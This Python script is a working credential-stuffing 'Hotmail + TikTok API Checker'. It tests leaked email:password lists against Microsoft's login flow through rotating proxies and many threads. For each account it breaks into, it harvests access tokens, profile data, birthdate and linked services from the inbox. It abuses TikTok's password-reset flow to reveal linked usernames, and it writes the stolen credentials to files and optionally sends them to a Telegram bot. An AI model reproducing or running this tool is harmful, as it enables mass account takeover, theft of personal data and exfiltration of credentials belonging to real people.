#updated by @baron_saplar
#updated by @baron_saplar
#updated by @baron_saplar
import os, sys, io, time, json, uuid, pycountry
import datetime, requests, threading, concurrent.futures
from colorama import Fore, Style, init
import random, re, secrets, binascii
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
from threading import Lock, Semaphore
init(autoreset=True)

# Import for TikTok API
try:
    import SignerPy
    import ms4
except ImportError:
    print("Installing required packages...")
    os.system("pip install SignerPy ms4 --break-system-packages")
    import SignerPy
    import ms4

# Colors
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE
HEADER = Fore.CYAN
HITS_COLOR = Fore.LIGHTGREEN_EX
BAD_COLOR = Fore.LIGHTRED_EX
RETRY_COLOR = Fore.LIGHTYELLOW_EX
TFA_COLOR = Fore.MAGENTA
WHITE = Fore.WHITE
INFO = Fore.CYAN
SUCCESS = Fore.GREEN
ERROR = Fore.RED
WARNING = Fore.YELLOW
MAGENTA = Fore.MAGENTA

# Globals
lock = threading.Lock()
hit = 0
bad = 0
retry = 0
total_combos = 0
processed = 0
linked_accounts = {}
checked_accounts = set()
rate_limit_semaphore = Semaphore(500)
tiktok_found = 0

# Config
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""

# Proxy Manager
class ProxyManager:
    def __init__(self, proxy_file=None):
        self.proxies = []
        self.current_index = 0
        if proxy_file and os.path.exists(proxy_file):
            self.load_proxies(proxy_file)
    
    def load_proxies(self, filename):
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        self.proxies.append(self.parse_proxy(line))
            print(f"{G}[✓] Loaded {len(self.proxies)} proxies{W}")
        except:
            pass
    
    def parse_proxy(self, proxy_line):
        parts = proxy_line.split(':')
        if len(parts) == 4:
            ip, port, user, password = parts
            return {'http': f"http://{user}:{password}@{ip}:{port}", 'https': f"http://{user}:{password}@{ip}:{port}"}
        elif len(parts) == 2:
            ip, port = parts
            return {'http': f"http://{ip}:{port}", 'https': f"http://{ip}:{port}"}
        return {}
    
    def get_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.proxies)
        return proxy

proxy_manager = ProxyManager()

def send_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, data={'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}, timeout=10)
    except:
        pass

def xor(string):
    """XOR function for TikTok API"""
    return "".join([hex(ord(c) ^ 5)[2:] for c in string])

def get_tiktok_info_from_email(email):
    """ORJINAL TIKTOK API - FULL CODE"""
    try:
        secret = secrets.token_hex(16)
        xor_email = xor(email)
        
        params = {
            "request_tag_from": "h5",
            "fixed_mix_mode": "1",
            "mix_mode": "1",
            "account_param": xor_email,
            "scene": "1",
            "device_platform": "android",
            "os": "android",
            "ssmix": "a",
            "type": "3736",
            "_rticket": str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
            "cdid": str(uuid.uuid4()),
            "channel": "googleplay",
            "aid": "1233",
            "app_name": "musical_ly",
            "version_code": "370805",
            "version_name": "37.8.5",
            "manifest_version_code": "2023708050",
            "update_version_code": "2023708050",
            "ab_version": "37.8.5",
            "resolution": "1600*900",
            "dpi": "240",
            "device_type": "SM-G998B",
            "device_brand": "samsung",
            "language": "en",
            "os_api": "28",
            "os_version": "9",
            "ac": "wifi",
            "is_pad": "0",
            "current_region": "TW",
            "app_type": "normal",
            "sys_region": "US",
            "last_install_time": "1754073240",
            "mcc_mnc": "46692",
            "timezone_name": "Asia/Baghdad",
            "carrier_region_v2": "466",
            "residence": "TW",
            "app_language": "en",
            "carrier_region": "TW",
            "timezone_offset": "10800",
            "host_abi": "arm64-v8a",
            "locale": "en-GB",
            "ac2": "wifi",
            "uoo": "1",
            "op_region": "TW",
            "build_number": "37.8.5",
            "region": "GB",
            "ts": str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
            "iid": str(random.randint(1, 10**19)),
            "device_id": str(random.randint(1, 10**19)),
            "openudid": str(binascii.hexlify(os.urandom(8)).decode()),
            "support_webview": "1",
            "okhttp_version": "4.2.210.6-tiktok",
            "use_store_region_cookie": "1",
            "app_version": "37.8.5"
        }
        
        cookies = {
            "passport_csrf_token": secret,
            "passport_csrf_token_default": secret,
            "install_id": params["iid"]
        }
        
        s = requests.session()
        
        # Temp mail generation
        temp_cookies = {
            '_ga_3DVKZSPS3D': 'GS2.1.s1754435486$o1$g0$t1754435486$j60$l0$h0',
            '_ga': 'GA1.1.504663773.1754435486',
            '__gads': 'ID=0cfb694765742032:T=1754435487:RT=1754435487:S=ALNI_MbIZNqLgouoeIxOQ2-N-0-cjxxS1A',
            '__gpi': 'UID=00001120bc366066:T=1754435487:RT=1754435487:S=ALNI_MaWgWYrKEmStGHPiLiBa1zlQOicuA',
            '__eoi': 'ID=22d520639150e74a:T=1754435487:RT=1754435487:S=AA-AfjZKI_lD2VnwMipZE8ienmGW',
            'FCNEC': '%5B%5B%22AKsRol8AtTXetHU2kYbWNbhPJd-c3l8flgQb4i54HStVK8CCEYhbcA3kEFqWYrBZaXKWuO9YYJN53FddyHbDf05q1qY12AeNafjxm2SPp7mhXZaop_3YiUwuo_WHJkehVcl5z4VyD7GHJ_D8nI2DfTX5RfrQWIHNMA%3D%3D%22%5D%5D',
        }
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en,ar;q=0.9,en-US;q=0.8',
            'application-name': 'web',
            'application-version': '4.0.0',
            'content-type': 'application/json',
            'origin': 'https://temp-mail.io',
            'priority': 'u=1, i',
            'referer': 'https://temp-mail.io/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'x-cors-header': 'iaWg3pchvFx48fY'
        }
        
        json_data = {
            'min_name_length': 10,
            'max_name_length': 10,
        }
        
        response = requests.post('https://api.internal.temp-mail.io/api/v3/email/new', cookies=temp_cookies, headers=headers, json=json_data)
        name = response.json()["email"]
        
        # TikTok account lookup
        url = "https://api16-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
        s.cookies.update(cookies)
        m = SignerPy.sign(params=params, cookie=cookies)
        
        headers = {
            'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 9; en_GB; SM-G998B; Build/SP1A.210812.016;tt-ok/3.12.13.16)",
            'x-ss-stub': m['x-ss-stub'],
            'x-tt-dm-status': "login=1;ct=1;rt=1",
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-ladon': m['x-ladon'],
            'x-khronos': m['x-khronos'],
            'x-argus': m['x-argus'],
            'x-gorgon': m['x-gorgon'],
            'content-type': "application/x-www-form-urlencoded",
        }
        
        proxy = proxy_manager.get_proxy()
        response = requests.post(url, headers=headers, params=params, cookies=cookies, proxies=proxy)
        
        if 'data' not in response.json() or 'accounts' not in response.json()['data']:
            return None
            
        passport_ticket = response.json()["data"]["accounts"][0]["passport_ticket"]
        name_xor = xor(name)
        
        # Send verification code
        url = "https://api16-normal-c-alisg.tiktokv.com/passport/email/send_code/"
        params.update({"not_login_ticket": passport_ticket, "email": name_xor})
        m = SignerPy.sign(params=params, cookie=cookies)
        
        headers = {
            'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 9; en_GB; SM-G998B; Build/SP1A.210812.016;tt-ok/3.12.13.16)",
            'Accept-Encoding': "gzip",
            'x-ss-stub': m['x-ss-stub'],
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-ladon': m['x-ladon'],
            'x-khronos': m['x-khronos'],
            'x-argus': m['x-argus'],
            'x-gorgon': m['x-gorgon'],
        }
        
        response = s.post(url, headers=headers, params=params, cookies=cookies, proxies=proxy)
        time.sleep(5)
        
        # Get temp mail messages
        temp_cookies['_ga_3DVKZSPS3D'] = 'GS2.1.s1754435486$o1$g0$t1754435503$j43$l0$h0'
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en,ar;q=0.9,en-US;q=0.8',
            'application-name': 'web',
            'application-version': '4.0.0',
            'content-type': 'application/json',
            'origin': 'https://temp-mail.io',
            'priority': 'u=1, i',
            'referer': 'https://temp-mail.io/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'x-cors-header': 'iaWg3pchvFx48fY'
        }
        
        response = requests.get(f'https://api.internal.temp-mail.io/api/v3/email/{name}/messages', cookies=temp_cookies, headers=headers)
        
        try:
            text = response.text.split('This email was generated for')[1]
            username = text.split('\\n')[0].strip()
            username = username.rstrip('.')
        except:
            username = None
        
        if not username:
            return None
        
        # Get full TikTok info
        ca = ms4.InfoTik.TikTok_Info(username)
        
        return ca
        
    except Exception as e:
        return None

def display_banner():
    banner = f"""
{G}{W}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    print(banner)

def animated_footer():
    time.sleep(0.6)
    footer = (
        f"\033[1m"
        f"{R}{W}"
        f"{B}{R}☠🫵{W}"
        f"{G} + TIKTOK API CHECKER  "
        f"{B}{R}☠🫵{W}{R}\033[0m"
    )
    print(footer)

def get_flag(country_name):
    try:
        country = pycountry.countries.lookup(country_name)
        return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
    except LookupError:
        return '🏳'

def update_progress():
    global hit, bad, retry, processed, total_combos, linked_accounts, tiktok_found
    
    with lock:
        progress_percent = min((processed / total_combos * 100), 100) if total_combos > 0 else 0
        linked_total = sum(linked_accounts.values())
        
        sys.stdout.write(f"\r{WHITE}Progress: {processed}/{total_combos} ({progress_percent:.1f}%) | "
                        f"{HITS_COLOR}Hits: {hit} {WHITE}| "
                        f"{BAD_COLOR}Bad: {bad} {WHITE}| "
                        f"{RETRY_COLOR}Retries: {retry} {WHITE}| "
                        f"Linked: {linked_total} | {C}TikTok: {tiktok_found}{WHITE}")
        sys.stdout.flush()

services = {
    "TikTok": {"sender": "register@account.tiktok.com", "file": "tiktok_accounts.txt"},
    "Facebook": {"sender": "security@facebookmail.com", "file": "facebook_accounts.txt"},
    "Instagram": {"sender": "security@mail.instagram.com", "file": "instagram_accounts.txt"},
}

def save_account_by_type(service_name, email, password):
    global linked_accounts
    try:
        service_info = services.get(service_name)
        if service_info:
            file_path = os.path.join("Accounts", service_info["file"])
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
            with lock:
                linked_accounts[service_name] = linked_accounts.get(service_name, 0) + 1
    except:
        pass

def save_tiktok_full_info(email, password, info):
 
    try:
        if not os.path.exists("TikTok_Hits"):
            os.makedirs("TikTok_Hits")
        
        output = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 Email      : {email}
🔑 Password   : {password}
👤 Username   : @{info.get('username', 'N/A')}
🎭 Name       : {info.get('name', 'N/A')}
🆔 User ID    : {info.get('id', 'N/A')}
🔑 SecUID     : {info.get('secuid', 'N/A')}
📍 Country    : {info.get('country', 'N/A')} {info.get('flag', '')}
🔒 Private    : {info.get('private', 'N/A')}
📝 Bio        : {info.get('bio', '') if info.get('bio') else 'N/A'}
👥 Followers  : {info.get('followers', '0')}
➡️ Following  : {info.get('following', '0')}
❤️ Likes      : {info.get('like', '0')}
🎬 Videos     : {info.get('video', '0')}
📡 Status     : {info.get('status', 'N/A')}
⏰ Checked    : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        
        with open("TikTok_Hits/tiktok_full_details.txt", 'a', encoding='utf-8') as f:
            f.write(output)
        
        # Telegram
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            tg_msg = f"""<b>🎯 TikTok Account Found!</b>

<b>📧 Email:</b> {email}
<b>🔑 Pass:</b> {password}
<b>👤 Username:</b> @{info.get('username', 'N/A')}
<b>🎭 Name:</b> {info.get('name', 'N/A')}
<b>🆔 ID:</b> {info.get('id', 'N/A')}
<b>📍 Country:</b> {info.get('country', 'N/A')} {info.get('flag', '')}
<b>🔒 Private:</b> {info.get('private', 'N/A')}
<b>👥 Followers:</b> {info.get('followers', '0')}
<b>❤️ Likes:</b> {info.get('like', '0')}
<b>🎬 Videos:</b> {info.get('video', '0')}
<b>⏰ Time:</b> {datetime.datetime.now().strftime('%H:%M:%S')}"""
            send_telegram(tg_msg)
    except:
        pass

def get_capture(email, password, token, cid):
    """ORJINAL get_capture"""
    global hit, processed, tiktok_found
    try:
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=30).json()
        name = response.get('names', [{}])[0].get('displayName', 'Unknown')
        country = response.get('accounts', [{}])[0].get('location', 'Unknown')
        flag = get_flag(country)
        
        try:
            birthdate = "{:04d}-{:02d}-{:02d}".format(
                response["accounts"][0]["birthYear"],
                response["accounts"][0]["birthMonth"],
                response["accounts"][0]["birthDay"]
            )
        except (KeyError, IndexError):
            birthdate = "Unknown"

        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        headers = {
            "Host": "outlook.live.com",
            "content-length": "0",
            "x-owa-sessionid": f"{cid}",
            "x-req-source": "Mini",
            "authorization": f"Bearer {token}",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36",
            "action": "StartupData",
            "x-owa-correlationid": f"{cid}",
            "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
            "content-type": "application/json; charset=utf-8",
            "accept": "*/*",
            "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.outlooklite",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://outlook.live.com/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9"
        }
        inbox_response = requests.post(url, headers=headers, data="", timeout=30).text

        linked_services = []
        for service_name, service_info in services.items():
            sender = service_info["sender"]
            if sender in inbox_response:
                count = inbox_response.count(sender)
                linked_services.append(f"[✔] {service_name} (Messages: {count})")
                save_account_by_type(service_name, email, password)

        linked_services_str = "\n".join(linked_services) if linked_services else "[×] No linked services found."

        capture = f"""
~~~~~~~~~~~~~~  ~~~~~~~~~~~~~~
Email : {email}
Password : {password}

Name : {name}
Country : {flag} {country}
Birthdate : {birthdate}

Linked Services :
{linked_services_str}
by : 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""
        with open('Hotmail-Hits.txt', 'a', encoding='utf-8') as f:
            f.write(capture)
            
        with lock:
            hit += 1
            processed += 1
        
     
        print(f"\n{C}[→] Checking TikTok for: {email}{W}")
        tiktok_info = get_tiktok_info_from_email(email)
        
        if tiktok_info and tiktok_info.get('username'):
            with lock:
                tiktok_found += 1
            print(f"{G}[✓] TikTok Found! @{tiktok_info.get('username')} | Followers: {tiktok_info.get('followers', '0')}{W}")
            save_tiktok_full_info(email, password, tiktok_info)
        else:
            print(f"{Y}[!] No TikTok found for: {email}{W}")
            
    except Exception as e:
        with lock:
            processed += 1
    finally:
        update_progress()

def check_account(email, password):


    try:
        session = requests.Session()
        
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15)
        
        if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
            return {"status": "BAD"}
        
        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=15)
        
        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        
        if not url_match or not ppft_match:
            return {"status": "BAD"}
        
        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)
        
        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
        
        r3 = session.post(post_url, data=login_data, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://login.live.com",
            "Referer": r2.url
        }, allow_redirects=False, timeout=15)
        
        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password"]):
            return {"status": "BAD"}
        
        if any(url in r3.text for url in ["identity/confirm", "Abuse", "signedout", "locked"]):
            return {"status": "BAD"}
            
        location = r3.headers.get("Location", "")
        if not location:
            return {"status": "BAD"}
        
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return {"status": "BAD"}
        
        code = code_match.group(1)
        
        token_data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        
        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
        
        if r4.status_code != 200 or "access_token" not in r4.text:
            return {"status": "BAD"}
        
        token_json = r4.json()
        access_token = token_json["access_token"]
        
        mspcid = None
        for cookie in session.cookies:
            if cookie.name == "MSPCID":
                mspcid = cookie.value
                break
        cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
        
        get_capture(email, password, access_token, cid)
        return {"status": "HIT"}
        
    except requests.exceptions.Timeout:
        return {"status": "RETRY"}
    except Exception as e:
        return {"status": "RETRY"}

def check_combo(email, password):
    global hit, bad, retry, processed
    
    account_id = f"{email}:{password}"
    if account_id in checked_accounts:
        with lock:
            processed += 1
        update_progress()
        return
        
    checked_accounts.add(account_id)
    
    with rate_limit_semaphore:
        time.sleep(random.uniform(0.01, 0.05))
        
        result = check_account(email, password)
        
        with lock:
            if result["status"] == "HIT":
                hit += 1
            elif result["status"] == "BAD":
                bad += 1
            elif result["status"] == "RETRY":
                retry += 1
            else:
                bad += 1
            
            processed += 1
        
        update_progress()

def main():
    global total_combos, processed, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, proxy_manager
    
    display_banner()
    print(f"{G} [✔️] Hotmail + TikTok API Checker {W}")
    print(f"--" * 25)
    
    file_path = input(" -[$] Combo File: ")
    
    proxy_file = input("  [-] Proxy file (Enter=skip): ").strip()
    if proxy_file:
        proxy_manager = ProxyManager(proxy_file)
    
    use_tg = input("  [-] Telegram? (y/n): ").strip().lower()
    if use_tg == 'y':
        TELEGRAM_BOT_TOKEN = input("  [-] Bot Token: ").strip()
        TELEGRAM_CHAT_ID = input("  [-] Chat ID: ").strip()
    
    while True:
        try:
            num_threads = int(input("  [-] Threads (20-200): "))
            if 1 <= num_threads <= 1000:
                break
        except ValueError:
            pass
    
    if not os.path.exists("Accounts"):
        os.makedirs("Accounts")
    
    for service_info in services.values():
        open(os.path.join("Accounts", service_info["file"]), 'a').close()
    
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f if ":" in line]
        total_combos = len(lines)
    except:
        print(f"{ERROR}[!] File error")
        exit(1)
    
    print("--" * 25)
    print(f"{INFO}[*] Total: {total_combos}")
    print(f"{INFO}[*] Starting...")
    time.sleep(2)
    
    update_progress()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for line in lines:
            try:
                email, password = line.split(":", 1)
                futures.append(executor.submit(check_combo, email.strip(), password.strip()))
            except:
                continue
        
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except:
                with lock:
                    retry += 1
                    processed += 1
                update_progress()
    
    print(f"\n\n{SUCCESS} [✔️] Done!")
    print(f"{HITS_COLOR} Hits: {hit} | {BAD_COLOR}Bad: {bad} | {RETRY_COLOR}Retries: {retry} | {C}TikTok: {tiktok_found}")
    
    if linked_accounts:
        print(f"{INFO} Linked:")
        for service, count in sorted(linked_accounts.items(), key=lambda x: x[1], reverse=True):
            print(f"  {service}: {count}")
    
    if tiktok_found > 0:
        print(f"{G}[✓] TikTok details: TikTok_Hits/tiktok_full_details.txt{W}")
    
    animated_footer()

if __name__ == "__main__":
    main()
